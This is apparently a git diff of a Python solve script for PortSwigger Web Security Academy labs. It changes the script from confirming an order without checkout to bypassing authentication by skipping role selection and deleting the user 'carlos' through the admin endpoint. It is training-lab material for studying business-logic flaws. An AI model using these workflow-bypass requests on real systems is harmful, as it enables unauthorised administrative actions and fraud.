@@ -1,18 +1,17 @@
-########################################################################
+#######################################################################################
 #
 # Author: Ahmed Elqalawy (@elqal3awii)
 #
-# Date: 27/10/2023
+# Date: 28/10/2023
 #
-# Lab: Insufficient workflow validation
+# Lab: Authentication bypass via flawed state machine
 #
-# Steps: 1. Fetch login page
-#        2. Extract the csrf token and session cookie
+# Steps: 1. Fetch the login page
+#        2. Extract the csrf token and session cookie to login
 #        3. Login as wiener
-#        4. Add the leather jacket to the cart
-#        5. Confirm order directly without checking out
+#        4. Delete carlos from the admin panel directly without selecting a role
 #
-########################################################################
+#######################################################################################
 
 
 ###########
@@ -28,7 +27,7 @@ from colorama import Fore
 ###########
 
 # change this to your lab URL
-url = "https://0a45003b04f03b7480e8adde007a0076.web-security-academy.net"
+url = "https://0af80010045e60d8805a35cb001600e6.web-security-academy.net"
 
 try:  
     # fetch the login page
@@ -46,7 +45,7 @@ session = login_page.cookies.get("session")
 # extract the csrf token
 csrf = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]
 
-print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie to login.. " + Fore.GREEN + "OK")
+print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. " + Fore.GREEN + "OK")
 
 # set credentials
 data = {
@@ -78,32 +77,17 @@ cookies = {
     "session": session
 }
 
-# data to send via POST
-data = {
-    "productId": "1",
-    "redir": "PRODUCT",
-    "quantity": "1",
-}
-
 try:  
-    # add the leather jacket to the cart
-    wiener = requests.post(f"{url}/cart", data, cookies=cookies)
+    # delete carlos directly since you have the session cookie and didn't select a role
+    # you don't have to fetch the admin panel first 
+    # when you don't select a role, the default will be an administrator
+    requests.get(f"{url}/admin/delete?username=carlos", cookies=cookies)
     
 except:
-    print(Fore.RED + "[!] Failed to add the leather jacket to the cart through exception")
+    print(Fore.RED + "[!] Failed to delete carlos through exception")
     exit(1)
 
-print(Fore.WHITE + "⦗4⦘ Adding the leather jacket to the cart.. " + Fore.GREEN + "OK")
-
-try:  
-    # confirm order directly without checking out
-    wiener = requests.get(f"{url}/cart/order-confirmation?order-confirmed=true", cookies=cookies)
-    
-except:
-    print(Fore.RED + "[!] Failed to fetch wiener's cart through exception")
-    exit(1)
-
-print(Fore.WHITE + "⦗5⦘ Confirming order directly without checking out.. " + Fore.GREEN + "OK")
+print(Fore.WHITE + "⦗4⦘ Deleting carlos from the admin panel directly without selecting a role.. " + Fore.GREEN + "OK")
 print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")
 
 
